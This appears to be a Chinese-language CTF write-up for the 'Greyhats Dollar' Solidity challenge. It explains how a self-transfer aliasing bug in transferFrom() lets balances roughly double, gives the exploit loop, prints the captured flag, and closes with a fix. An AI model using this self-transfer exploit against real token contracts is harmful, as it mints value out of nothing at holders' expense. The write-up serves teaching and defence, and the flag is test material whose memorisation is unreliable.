# Greyhats Dollar

## 题目简述

GHD 用 shares 记录余额，并随时间降低 shares 到 GHD 的兑换率。玩家只能领取 1000 GREY 并铸造 1000 GHD，但通关要求持有至少 50000 GHD。漏洞位于 `transferFrom()` 对自转账的处理：发送方和接收方相同时，两个临时余额都从同一个旧值计算，后一次写入覆盖前一次扣减。

## 解题过程

先领取并铸造初始余额：

```solidity
setup.claim();
grey.approve(address(ghd), 1000e18);
ghd.mint(1000e18);
```

转账函数计算：

```solidity
uint256 fromShares = shares[from] - movedShares;
uint256 toShares   = shares[to]   + movedShares;

shares[from] = fromShares;
shares[to]   = toShares;
```

当 `from == to` 时，`fromShares` 与 `toShares` 都读取同一个原始槽位。第一条赋值先扣减，第二条赋值随即把同一槽位覆盖为“原余额加转账额”，扣减结果完全丢失。合约中的两项“金额不能小到被舍入为零”的检查也会通过，因为临时扣减余额确实更小、临时增加余额确实更大。

每次把当前全部 GHD 转给自己，最终 shares 近似翻倍：

```solidity
uint256 balance = ghd.balanceOf(address(this));
while (balance < 50_000e18) {
    ghd.transfer(address(this), balance);
    balance = ghd.balanceOf(address(this));
}
```

重复若干次并把余额交给外部玩家地址，即可满足检查并取得：

```text
grey{self_transfer_go_brrr_9e8284917b42282d}
```

## 方法总结

任何同时更新 `from` 和 `to` 的余额逻辑都必须显式考虑地址别名。即使算术本身在 Solidity 0.8 下有溢出保护，只要两个逻辑角色映射到同一个存储槽，按旧快照分别计算再顺序写回仍会凭空增发资产。最简单的修复是禁止 `from == to`，或在同一份状态上完成守恒更新。
